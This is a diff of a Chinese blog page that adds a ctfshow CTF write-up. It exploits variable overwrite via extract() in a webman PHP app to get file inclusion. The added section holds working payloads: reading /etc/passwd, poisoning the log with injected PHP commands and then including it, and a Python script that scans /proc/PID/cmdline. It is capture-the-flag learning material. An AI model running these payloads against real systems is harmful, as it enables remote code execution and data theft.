@@ -54,12 +54,12 @@
             <ul>
             
                 <li>
-                    <a href="/2025/11/11/nssctf%E5%AD%A6%E4%B9%A0%E4%B8%AD/" class="post-title-link">nssctf学习中</a>
-                    <div class="post-date">2025-11-26</div>
+                    <a href="/2025/11/16/ctfshow%E7%9A%84%E8%AF%95%E7%82%BC/" class="post-title-link">ctfshow的试炼</a>
+                    <div class="post-date">2025-11-27</div>
                 </li>
             
                 <li>
-                    <a href="/2025/11/16/ctfshow%E7%9A%84%E8%AF%95%E7%82%BC/" class="post-title-link">ctfshow的试炼</a>
+                    <a href="/2025/11/11/nssctf%E5%AD%A6%E4%B9%A0%E4%B8%AD/" class="post-title-link">nssctf学习中</a>
                     <div class="post-date">2025-11-26</div>
                 </li>
             
@@ -107,7 +107,7 @@
     <h1 class="post-title" style="font-size: 2.2em; margin-bottom: 15px; color: #333;">ctfshow的试炼</h1>
     <div class="post-meta" style="color: #999; margin-bottom: 40px; border-bottom: 1px solid #eee; padding-bottom: 15px;">
         📅 发布于: 2025-11-16 16:01 
-        | 📝 更新于: 2025-11-26 18:47
+        | 📝 更新于: 2025-11-27 19:02
     </div>
     
     <div class="article-content" id="article-content">
@@ -328,6 +328,198 @@
 <p><strong>ctfshow{cd97fbc9-515f-496c-8c4f-d431a9ecc833}</strong></p>
 <p>总结:真是一场酣畅淋漓的学习之旅，整道题最核心的点莫过于对整个音频进行数据流的整理了，如果数据小一点，也不至于这么麻烦，我只能说misc真是大手子，轻易就干废了我。</p>
 <hr>
+<h1 id="5-迷雾重重"><a href="#5-迷雾重重" class="headerlink" title="#5.迷雾重重"></a>#5.迷雾重重</h1><p><img src="/images/QQ20251127-165313.png" alt="alt text"></p>
+<p>做这题的时候想起了之前newstar的pop链，那一题的名字叫小羊走迷宫，那是我第一次遇到pop链，用了不少ai，但没有做出来，也不知道官方环境什么时候复现，回去看看。</p>
+<p>好了好了，回到这一题来，这一题的考点两个，代码审计，加任意文件包含漏洞，其实还有点反序列化，但那是一个陷阱，卡了我两天了。</p>
+<p>题目的附件就是源码，先做的就是好好研究源码。</p>
+<p><img src="/images/QQ20251127-171343.png" alt="alt text"></p>
+<p> 压缩 一下，仔细研究这里面的好几个的php。</p>
+<p>“C:\Users\G1731\Downloads\app\app\controller\IndexController.php”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace app\controller;</span><br><span class="line"></span><br><span class="line">use support\Request;</span><br><span class="line"></span><br><span class="line">use support\exception\BusinessException;</span><br><span class="line"></span><br><span class="line">class IndexController</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  public function index(Request $request)</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">​    </span><br><span class="line"></span><br><span class="line">​    return view(&#x27;index/index&#x27;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function testUnserialize(Request $request)&#123;</span><br><span class="line"></span><br><span class="line">​    if(null !== $request-&gt;get(&#x27;data&#x27;))&#123;</span><br><span class="line"></span><br><span class="line">​      $data = $request-&gt;get(&#x27;data&#x27;);</span><br><span class="line"></span><br><span class="line">​      unserialize($data);</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    return &quot;unserialize测试完毕&quot;;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function testJson(Request $request)&#123;</span><br><span class="line"></span><br><span class="line">​    if(null !== $request-&gt;get(&#x27;data&#x27;))&#123;</span><br><span class="line"></span><br><span class="line">​      $data = json_decode($request-&gt;get(&#x27;data&#x27;),true);</span><br><span class="line"></span><br><span class="line">​      if(null!== $data &amp;&amp; $data[&#x27;name&#x27;] == &#x27;guest&#x27;)&#123;</span><br><span class="line"></span><br><span class="line">​        return view(&#x27;index/view&#x27;, $data);</span><br><span class="line"></span><br><span class="line">​      &#125;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    return &quot;json_decode测试完毕&quot;;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function testSession(Request $request)&#123;</span><br><span class="line"></span><br><span class="line">​    $session = $request-&gt;session();</span><br><span class="line"></span><br><span class="line">​    $session-&gt;set(&#x27;username&#x27;,&quot;guest&quot;);</span><br><span class="line"></span><br><span class="line">​    $data = $session-&gt;get(&#x27;username&#x27;);</span><br><span class="line"></span><br><span class="line">​    return &quot;session测试完毕 username: &quot;.$data;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function testException(Request $request)&#123;</span><br><span class="line"></span><br><span class="line">​    if(null != $request-&gt;get(&#x27;data&#x27;))&#123;</span><br><span class="line"></span><br><span class="line">​      $data = $request-&gt;get(&#x27;data&#x27;);</span><br><span class="line"></span><br><span class="line">​      throw new BusinessException(&quot;业务异常 &quot;.$data,3000);</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    return &quot;exception测试完毕&quot;;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>好几个都是框架，害得我得一个一个的查，累死了。</p>
+<p>其中令我耳目一新的就是这个php，也是这个代码害我一入反序列化不知深浅。</p>
+<p>尝试构建各种rce或者文件写入，均失败，更气人的是这题目还有设置，不回显路径，完全就不让你知道错了，然后写入文件就是404，怎么样，文件中的命令都不被执行，只能说，g。</p>
+<p>对了给一下，我利用的源代码吧，”C:\Users\G1731\Downloads\app\process\Monitor.php”，这个，将这个仔细的看来看去，也是找到能用的，虽然实际是没有成功的。</p>
+<p>真正的方向是在”C:\Users\G1731\Downloads\app\vendor\workerman\webman-framework\src\support\view\Raw.php”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"></span><br><span class="line"> * This file is part of webman.</span><br><span class="line">   *</span><br><span class="line"> * Licensed under The MIT License</span><br><span class="line"> * For full copyright and license information, please see the MIT-LICENSE.txt</span><br><span class="line"> * Redistributions of files must retain the above copyright notice.</span><br><span class="line">   *</span><br><span class="line"> * @author    walkor&lt;walkor@workerman.net&gt;</span><br><span class="line"> * @copyright walkor&lt;walkor@workerman.net&gt;</span><br><span class="line"> * @link      http://www.workerman.net/</span><br><span class="line"> * @license   http://www.opensource.org/licenses/mit-license.php MIT License</span><br><span class="line">   */</span><br><span class="line"></span><br><span class="line">namespace support\view;</span><br><span class="line"></span><br><span class="line">use Throwable;</span><br><span class="line">use Webman\View;</span><br><span class="line">use function app_path;</span><br><span class="line">use function array_merge;</span><br><span class="line">use function base_path;</span><br><span class="line">use function config;</span><br><span class="line">use function extract;</span><br><span class="line">use function is_array;</span><br><span class="line">use function ob_end_clean;</span><br><span class="line">use function ob_get_clean;</span><br><span class="line">use function ob_start;</span><br><span class="line">use function request;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"></span><br><span class="line"> * Class Raw</span><br><span class="line"></span><br><span class="line"> * @package support\view</span><br><span class="line">   */</span><br><span class="line">   class Raw implements View</span><br><span class="line">   &#123;</span><br><span class="line">   /**</span><br><span class="line"></span><br><span class="line">    * Assign.</span><br><span class="line">    * @param string|array $name</span><br><span class="line">    * @param mixed $value</span><br><span class="line">      */</span><br><span class="line">      public static function assign($name, $value = null)</span><br><span class="line">      &#123;</span><br><span class="line">      $request = request();</span><br><span class="line">      $request-&gt;_view_vars = array_merge((array) $request-&gt;_view_vars, is_array($name) ? $name : [$name =&gt; $value]);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">   /**</span><br><span class="line"></span><br><span class="line">    * Render.</span><br><span class="line"></span><br><span class="line">    * @param string $template</span><br><span class="line"></span><br><span class="line">    * @param array $vars</span><br><span class="line"></span><br><span class="line">    * @param string|null $app</span><br><span class="line"></span><br><span class="line">    * @param string|null $plugin</span><br><span class="line"></span><br><span class="line">    * @return false|string</span><br><span class="line">      */</span><br><span class="line">      public static function render(string $template, array $vars, string $app = null, string $plugin = null): string</span><br><span class="line">      &#123;</span><br><span class="line">      $request = request();</span><br><span class="line">      $plugin = $plugin === null ? ($request-&gt;plugin ?? &#x27;&#x27;) : $plugin;</span><br><span class="line">      $configPrefix = $plugin ? &quot;plugin.$plugin.&quot; : &#x27;&#x27;;</span><br><span class="line">      $viewSuffix = config(&quot;&#123;$configPrefix&#125;view.options.view_suffix&quot;, &#x27;html&#x27;);</span><br><span class="line">      $app = $app === null ? ($request-&gt;app ?? &#x27;&#x27;) : $app;</span><br><span class="line">      $baseViewPath = $plugin ? base_path() . &quot;/plugin/$plugin/app&quot; : app_path();</span><br><span class="line">      $__template_path__ = $app === &#x27;&#x27; ? &quot;$baseViewPath/view/$template.$viewSuffix&quot; : &quot;$baseViewPath/$app/view/$template.$viewSuffix&quot;;</span><br><span class="line"></span><br><span class="line">      if(isset($request-&gt;_view_vars)) &#123;</span><br><span class="line">          extract((array)$request-&gt;_view_vars);</span><br><span class="line">      &#125;</span><br><span class="line">      extract($vars);</span><br><span class="line">      ob_start();</span><br><span class="line">      // Try to include php file.</span><br><span class="line">      try &#123;</span><br><span class="line">          include $__template_path__;</span><br><span class="line">      &#125; catch (Throwable $e) &#123;</span><br><span class="line">          ob_end_clean();</span><br><span class="line">          throw $e;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      return ob_get_clean();</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<pre><code>  public static function render(string $template, array $vars, string $app = null, string $plugin = null): string
+  {
+  $request = request();
+  $plugin = $plugin === null ? ($request-&gt;plugin ?? &#39;&#39;) : $plugin;
+  $configPrefix = $plugin ? &quot;plugin.$plugin.&quot; : &#39;&#39;;
+  $viewSuffix = config(&quot;{$configPrefix}view.options.view_suffix&quot;, &#39;html&#39;);
+  $app = $app === null ? ($request-&gt;app ?? &#39;&#39;) : $app;
+  $baseViewPath = $plugin ? base_path() . &quot;/plugin/$plugin/app&quot; : app_path();
+  $__template_path__ = $app === &#39;&#39; ? &quot;$baseViewPath/view/$template.$viewSuffix&quot; : &quot;$baseViewPath/$app/view/$template.$viewSuffix&quot;;
+
+  if(isset($request-&gt;_view_vars)) {
+      extract((array)$request-&gt;_view_vars);
+  }
+  extract($vars);
+  ob_start();
+  // Try to include php file.
+  try {
+      include $__template_path__;
+</code></pre>
+<hr>
+<p>public static function render($template, $vars, …)</p>
+<p><em><code>$__template_path__ = $app === &#39;&#39; ? ... : ...;</code></em></p>
+<p>网站框架先计算出合法的物理文件路径，比如 <code>/var/www/html/app/view/index/index.html</code>，赋值给局部变量 <code>$__template_path__</code>。</p>
+<p>*<code>extract($vars);</code>*是漏洞核心点。</p>
+<p><code>$vars</code> 是我们传入的数组。<code>extract</code> 默认配置是 <code>EXTR_OVERWRITE</code>（有同名变量直接覆盖）。</p>
+<p><em><code>include $__template_path__;</code></em>   最后包含这个路径。</p>
+<p>接下来看看内存里，假设我们构造 Payload：<code>?data={&quot;name&quot;:&quot;guest&quot;, &quot;__template_path__&quot;: &quot;/etc/passwd&quot;}</code>。</p>
+<p><code>$vars</code> 数组里就有了 <code>__template_path__</code> 这个key。</p>
+<ol>
+<li><p>代码先执行路径计算，<code>$__template_path__</code> 内存里是正常的 index.html 路径。</p>
+</li>
+<li><p>代码执行 <em><code>extract($vars)</code></em>。</p>
+<p>解析到键 <code>&quot;name&quot;</code>，创建新变量 <code>$name</code>。</p>
+<p>解析到键 <code>&quot;__template_path__&quot;</code>，发现当前作用域里已经有这个变量了。</p>
+<p>因为没加 <code>EXTR_SKIP</code>，直接无视原值，强制覆盖。</p>
+<p>此时内存里 <code>$__template_path__</code> 变成了我们注入的 <code>&quot;/etc/passwd&quot;</code>。</p>
+</li>
+<li><p>代码执行 <em><code>include</code></em>。</p>
+</li>
+<li><p>php 去读取 <code>$__template_path__</code>。</p>
+<p>读到的是被篡改后的路径，直接包含，文件覆盖就完成了。</p>
+</li>
+</ol>
+<p>但是文件覆盖了又能怎么样，不好意思，这个就很像cve了，我们完全可以弄个木马进去啊。</p>
+<p>构造 payload：<code>?data={&quot;name&quot;:&quot;guest&quot;, &quot;__template_path__&quot;: &quot;&lt;?php system(&#39;ls /&#39;);?&gt;&quot;}</code></p>
+<p>随后php就会尝试在文件系统里找一个名字叫 <code>&lt;?php system(&#39;ls /&#39;);?&gt;</code> 的文件。</p>
+<p>结果当然是找不到的，所以php代码会显示错误。</p>
+<hr>
+<pre><code>  } catch (Throwable $e) {
+      ob_end_clean();
+      throw $e;
+</code></pre>
+<hr>
+<p>根据源代码，如果报错，那这个错误就会被扔到上层。</p>
+<p><img src="/images/QQ20251127-184356.png" alt="alt text"></p>
+<p>所以最终这个错误就会被Log::error($e)捕获，保留在网站的日志中。</p>
+<p>接下来我们的目标就是找到日志所在点了。</p>
+<p>但这边我就不会了，本来学到上面的错误文件执行已经是我的极限了，后面找这个日志我是真不行。</p>
+<p>我就直接让ai给我代码了。</p>
+<pre><code>import requests
+import json
+import time
+import urllib3
+
+# 1. 基础配置
+
+# -------------------------------------------------------
+
+# 禁用 HTTPS 证书警告（CTF 题目很多是自签名证书，不禁用会满屏报错）
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# 🎯 目标 URL：请替换为你当前的题目靶机地址
+
+# 注意：必须以 / 结尾，例如 http://ip:port/
+
+TARGET_URL = &quot;https://7bad1824-e49a-4e34-9620-57039c589b0d.challenge.ctf.show/&quot;
+
+def find_webroot():
+    print(f&quot;[+] 开始扫描 PID，目标: {TARGET_URL}&quot;)
+    print(&quot;[+] 正在尝试读取 /proc/[PID]/cmdline ...&quot;)
+# 2. 爆破循环
+# -------------------------------------------------------
+# 为什么是 1 到 300？
+# 在 Docker 容器中，PID 通常很小。
+# PID 1 通常是入口进程，PID 2-20 通常是其启动的子进程。
+# 只要找到其中一个保留了原始启动命令的进程即可。
+for pid in range(1, 300):
+    
+    # 3. 构造 Payload (核心攻击点)
+    # ---------------------------------------------------
+    # 漏洞原理：变量覆盖导致 LFI
+    # 我们利用 extract($vars) 覆盖了内部变量 $__template_path__
+    # 将其指向 Linux 的进程信息文件 /proc/[PID]/cmdline
+    target_file = f&quot;/proc/{pid}/cmdline&quot;
+    
+    payload_data = {
+        &quot;name&quot;: &quot;guest&quot;,                # 满足 if(data[&#39;name&#39;] == &#39;guest&#39;) 的前置条件
+        &quot;__template_path__&quot;: target_file # 恶意的路径变量
+    }
+
+    try:
+        # 4. 发送请求
+        # -----------------------------------------------
+        # Webman 接收的是 data 参数，且需要是 JSON 字符串格式
+        r = requests.get(
+            url=TARGET_URL + &#39;index/testJson&#39;,
+            params={&quot;data&quot;: json.dumps(payload_data)}, # 自动将字典转为 JSON 字符串
+            verify=False, # 不验证 SSL 证书
+            timeout=2     # 设置超时，防止卡死
+        )
+
+        # 5. 结果分析 (特征匹配)
+        # -----------------------------------------------
+        # 我们的目标是找到启动命令，例如： &quot;php /var/www/html/app/start.php start&quot;
+        # 所以我们搜索 &quot;start.php&quot; 这个关键词。
+        if &quot;start.php&quot; in r.text:
+            print(f&quot;\n[!] 在 PID: {pid} 发现关键信息！&quot;)
+            
+            # --- 提取路径逻辑 (字符串清洗) ---
+            # 返回的内容通常混杂了 null 字节 (\x00) 或者框架的报错信息
+            # 典型返回示例: ...start_file=/var/www/html/webrooth1xaa/start.php...
+            
+            content = r.text
+            
+            # 尝试提取绝对路径
+            # 思路：找到 &quot;start.php&quot; 的位置，向左截取直到遇到路径特征
+            if &quot;start_file=&quot; in content:
+                # 这种情况通常出现在框架把变量 dump 出来的时候
+                # split 切割提取
+                temp = content.split(&quot;start_file=&quot;)[1] 
+                full_path = temp.split(&quot;.php&quot;)[0] + &quot;.php&quot;
+                
+                # 去掉文件名的部分，只留目录
+                # /var/www/html/webrooth1xaa/start.php -&gt; /var/www/html/webrooth1xaa
+                webroot = full_path.replace(&quot;/start.php&quot;, &quot;&quot;)
+                
+                print(f&quot;✅ 成功提取 Webroot: {webroot}&quot;)
+                print(f&quot;📝 完整启动命令痕迹: {full_path}&quot;)
+                return webroot
+            
+            else:
+                # 如果是纯 raw 文本，可能需要人工看一眼
+                print(f&quot;⚠️ 发现 &#39;start.php&#39; 但自动提取失败，请手动分析以下返回内容片段：&quot;)
+                print(content[:200]) # 打印前200字符
+                return None
+
+    except Exception as e:
+        # 网络错误直接跳过
+        pass
+        
+    # 稍微延时，避免请求过快被防火墙拦截（虽然 CTF 环境通常没有）
+    # time.sleep(0.05) 
+
+print(&quot;\n[-] 扫描结束，未找到 Webroot。&quot;)
+return None
+if __name__ == &quot;__main__&quot;:
+    find_webroot()
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\G1731&gt; &amp; C:/Users/G1731/anaconda3/python.exe c:/Users/G1731/scan_pop.py</span><br><span class="line">[+] 开始扫描 PID，目标: https://5a93e3c8-9b5f-4d81-ac97-b9df647bd32d.challenge.ctf.show/</span><br><span class="line">[+] 正在尝试读取 /proc/[PID]/cmdline ...</span><br><span class="line"></span><br><span class="line">[!] 在 PID: 8 发现关键信息！</span><br><span class="line">✅ 成功提取 Webroot: /var/www/html/webrooth1xaa</span><br><span class="line">📝 完整启动命令痕迹: /var/www/html/webrooth1xaa/start.php</span><br><span class="line">PS C:\Users\G1731&gt; </span><br></pre></td></tr></table></figure>
+
+<p>成功确认Web 根目录<code>/var/www/html/webrooth1xaa</code></p>
+<p>上网查日志路径规则是<code>runtime/logs/webman-Y-m-d.log</code>这样的。</p>
+<p>所以最终构造 Payload<code>?data={&quot;name&quot;:&quot;guest&quot;, &quot;__template_path__&quot;: &quot;/var/www/html/webrooth1xaa/runtime/logs/webman-2025-11-27.log&quot;}</code></p>
+<p>到这里，两步绝杀了，首先我们让错误文件上传。</p>
+<p><code>{&quot;name&quot;:&quot;guest&quot;, &quot;__template_path__&quot;: &quot;&lt;?php </code>cat &#x2F;s00* &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;webrooth1xaa&#x2F;public&#x2F;flag.txt<code>; ?&gt;&quot;}</code></p>
+<p><code>https://5a93e3c8-9b5f-4d81-ac97-b9df647bd32d.challenge.ctf.show/index/testJson?data=%7B%22name%22%3A%22guest%22%2C%20%22__template_path__%22%3A%20%22%3C%3Fphp%20%60cat%20%2Fs00%2A%20%3E%20%2Fvar%2Fwww%2Fhtml%2Fwebrooth1xaa%2Fpublic%2Fflag.txt%60%3B%20%3F%3E%22%7D</code></p>
+<p>记得url编码，不然执行不了。</p>
+<p><code>{&quot;name&quot;:&quot;guest&quot;, &quot;__template_path__&quot;: &quot;/var/www/html/webrooth1xaa/runtime/logs/webman-2025-11-27.log&quot;}</code></p>
+<p><code>https://5a93e3c8-9b5f-4d81-ac97-b9df647bd32d.challenge.ctf.show/index/testJson?data=%7B%22name%22%3A%22guest%22%2C%20%22__template_path__%22%3A%20%22%2Fvar%2Fwww%2Fhtml%2Fwebrooth1xaa%2Fruntime%2Flogs%2Fwebman-2025-11-27.log%22%7D</code></p>
+<p>得到日志，最后直接访问<code>https://5a93e3c8-9b5f-4d81-ac97-b9df647bd32d.challenge.ctf.show/flag.txt</code></p>
+<p>ctfshow{6a9025fc-8cb0-4de4-90d6-d7275ac512b0}</p>
+<p>拿下。</p>
 <hr>
 <p>   版权声明：本文由白白毛毛创作，转载请注明出处。</p>
 
